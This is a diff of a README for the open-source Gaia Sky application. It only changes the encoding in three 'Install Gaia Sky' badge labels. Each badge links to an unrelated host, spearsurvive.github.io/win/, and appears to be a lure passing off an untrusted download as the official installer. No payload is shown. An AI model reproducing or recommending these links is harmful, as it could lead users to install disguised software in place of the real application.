@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Gaia Sky](https://img.shields.io/badge/⬇_Install_Gaia%20Sky-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Gaia Sky](https://img.shields.io/badge/⬇_Install_Gaia+Sky-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Gaia Sky is a free, open-source real-time 3D universe exploration application ba
 
 <div align="center">
 
-[![⬇ Install Gaia Sky](https://img.shields.io/badge/⬇_Install_Gaia%20Sky-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Gaia Sky](https://img.shields.io/badge/⬇_Install_Gaia+Sky-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Gaia Sky is a free, open-source real-time 3D universe exploration application ba
 
 <div align="center">
 
-[![⬇ Install Gaia Sky](https://img.shields.io/badge/⬇_Install_Gaia%20Sky-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Gaia Sky](https://img.shields.io/badge/⬇_Install_Gaia+Sky-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
